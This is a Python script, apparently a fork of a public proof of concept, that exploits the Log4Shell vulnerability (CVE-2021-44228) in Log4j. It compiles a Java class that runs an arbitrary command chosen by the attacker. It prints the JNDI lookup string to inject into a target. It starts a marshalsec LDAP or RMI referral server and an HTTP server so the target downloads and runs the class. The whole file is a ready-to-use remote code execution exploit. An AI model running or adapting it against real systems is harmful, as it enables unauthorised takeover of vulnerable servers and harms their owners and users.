#!/usr/bin/env python3

import argparse
import os
import threading
from pathlib import Path
from http.server import HTTPServer, SimpleHTTPRequestHandler



def generate_payload(cmd: str) -> None:
    program = """
public class index {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("%s");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
""" % (cmd)

    p = Path(f"index.java")
    
    try:
        p.write_text(program)
        os.system(f"javac -source 8 -target 8 {str(p)}")
    except OSError as e:
        print(f'[-] Something went wrong {e}')
        raise e
    else:
        print(f"[+] Exploit java class created success")


def payload(service: str, ip: str, port: int, webport: int, cmd: str) -> None:
    generate_payload(cmd)

    print(f"[+] Setting up {service} server\n")

    # create the service server on new thread
    t1 = threading.Thread(target=service_server, args=(service, ip, port, webport))
    t1.start()

    # start the web server
    print(f"[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}")
    httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
    httpd.serve_forever()


def check_java() -> None:
    print("Checking Java...")


def service_server(service: str, ip: str, port: int, webport: int) -> None:
    sendme = "${jndi:%s://%s:%s/index}" % (service.lower(), ip, port)
    print(f"[+] Simple payload: {sendme}")

    url = "http://{}:{}/#index".format(ip, webport)
    os.system(f"java -cp marshalsec/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.{service}RefServer {url} {str(port)}")


def main() -> None:
    print("""
[!] CVE: CVE-2021-44228
[!] Forked from: https://github.com/kozmer/log4j-shell-poc
[!] Edit by NagisaYumaa, with RMI option, Command option, simple Java class
""")

    parser = argparse.ArgumentParser(description='Log4Shell Exploit')
    parser.add_argument('--ip',
                        metavar='ip',
                        type=str,
                        default='localhost',
                        help='Enter IP for LDAPRefServer & Shell')
    parser.add_argument('--service',
                        metavar='service',
                        type=str,
                        default='LDAP',
                        help='Service: LDAP or RMI')
    parser.add_argument('--port',
                        metavar='port',
                        type=int,
                        default='1389',
                        help='listener port for LDAP port')
    parser.add_argument('--webport',
                        metavar='webport',
                        type=int,
                        default='8000',
                        help='listener port for HTTP port')
    parser.add_argument('--cmd',
                        metavar='cmd',
                        type=str,
                        default='ping',
                        help='command to run in target')

    args = parser.parse_args()

    try:
        check_java()
        payload(args.service, args.ip, args.port, args.webport, args.cmd)
    except KeyboardInterrupt:
        print("\nInterrupted the program.")
        print("\n[+] Clean up *.java and *.class")
        os.remove("index.java")
        os.remove("index.class")
        raise SystemExit(0)


if __name__ == "__main__":
    main()
